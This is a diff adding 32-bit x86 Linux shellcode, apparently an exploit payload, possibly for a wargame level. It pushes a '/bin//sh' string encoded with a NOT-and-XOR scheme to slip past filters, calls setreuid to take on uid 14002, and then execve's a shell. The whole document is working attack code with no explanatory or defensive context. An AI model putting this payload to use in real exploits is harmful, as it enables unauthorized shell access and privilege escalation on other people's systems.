@@ -1,0 +1,32 @@
+  xor esi,esi           ;clear register
+  push esi              ;push null bytes
+
+  mov esi,0x4a406b7a    ;encoded \\sh
+  not esi               ;bit flip
+  xor esi,0xddccbbaa    ;decode
+  push dword esi        ;push to stack
+
+  mov esi,0x4c5a267a    ;encoded \bin
+  not esi               ;bit flip
+  xor esi,0xddccbbaa    ;decode
+  push dword esi        ;push to stack
+
+  xor ebx,ebx           ;clear registers
+  xor ecx,ecx
+  xor edx,edx
+  mul edx
+
+  mov al,0x46           ;setreuid
+  mov bx,0x36b2         ;ruid 14002
+  mov cx,0x36b2         ;euid 14002
+  int 0x80              ;call
+
+  mov al,0xb            ;execve
+  mov ebx,esp           ;filename from stack
+  xor ecx,ecx           ;null pointers
+  int 0x80              ;call
+
+  xor ebx,ebx           ;exit
+  mul ebx
+  mov al,1
+  int 0x80
